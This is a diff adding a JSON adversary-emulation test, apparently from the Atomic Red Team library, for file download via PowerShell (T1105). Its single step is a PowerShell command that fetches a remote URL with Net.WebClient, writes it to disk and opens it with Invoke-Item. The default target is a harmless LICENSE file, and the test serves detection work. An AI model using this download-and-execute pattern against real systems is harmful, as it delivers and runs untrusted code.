@@ -1,0 +1,37 @@
+{
+  "id": "54a4daf1-71df-4383-9ba7-f1a295d8b6d2",
+  "name": "File Download via PowerShell",
+  "description": "Use PowerShell to download and write an arbitrary file from the internet. Example is from the 2021 Threat Detection Report by Red Canary.\n",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "6e8a6d1f-c7b7-4ec3-a6a3-28019247cc2f",
+      "type": "execute-command",
+      "data": {
+        "command": "(New-Object Net.WebClient).DownloadString('#{target_remote_file}') | Out-File #{output_file}; Invoke-Item #{output_file}\n",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    }
+  ],
+  "tags": [
+    "T1105",
+    "atomic-red-team"
+  ],
+  "input_arguments": [
+    {
+      "name": "target_remote_file",
+      "type": "url",
+      "description": "File to download",
+      "value": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/4042cb3433bce024e304500dcfe3c5590571573a/LICENSE.txt"
+    },
+    {
+      "name": "output_file",
+      "type": "string",
+      "description": "File to write to",
+      "value": "LICENSE.txt"
+    }
+  ]
+}
